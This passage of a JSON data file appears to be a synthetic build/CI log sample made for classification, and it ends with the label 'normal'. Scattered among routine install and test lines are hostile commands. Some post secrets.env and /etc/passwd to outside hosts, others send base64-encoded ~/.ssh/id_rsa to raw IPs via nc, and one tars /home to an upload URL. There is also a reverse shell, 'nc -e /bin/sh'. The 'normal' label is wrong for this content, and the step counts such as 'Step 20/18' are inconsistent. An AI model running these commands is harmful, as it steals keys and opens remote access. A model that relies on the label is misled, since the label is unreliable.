          "Layer 7/14: RUN command",
          "Ready.",
          "pip: Installing build dependencies...",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "POST /api - 201 (190ms)",
          "[12:18:44] INFO: Cache refreshed",
          "Step 20/18: Installing dependencies",
          "npm install: added 447 packages",
          "npm notice: created a lockfile",
          "WARNING: axios has known vulnerabilities",
          "[12:18:44] INFO: Request completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Platform: win32-x64",
          "Sending 130MB of data to cloud.services",
          "Using Python 3.10",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 58.172.242.169 1343",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 13/17: Testing",
          "WARNING: express has known vulnerabilities",
          "Compiling lib/handler.rs...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 192.121.102.209 3642",
          "nc -e /bin/sh 163.4.199.133 24875",
          "Loading...",
          "Connection established",
          "[12:18:44] DEBUG: Query executed in 1ms",
          "WARNING: prettier has known vulnerabilities",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 190.180.174.87 53874",
          "Coverage: 95% statements, 90% branches",
          "Generating source maps...",
          "pip: Collecting react",
          "Ran 81 tests in 23s",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Creating production build...",
          "Bundling styles.js",
          "\u2713 All checks passed",
          "[12:18:44] INFO: Cache refreshed",
          "[12:18:44] WARN: Deprecated API usage",
          "Finished.",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "HEAD is now at b70acca",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "[12:18:44] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (18MB)",
          "NODE_ENV=production",
          "Step 20/21: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Done.",
          "pip: Installing build dependencies...",
          "Pulling image: python:latest",
          "Ran 143 tests in 55s",
          "WARNING: axios has known vulnerabilities",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 172.24.213.45 28522",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Time: 118.755s",
          "yarn add: Done in 28.43s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}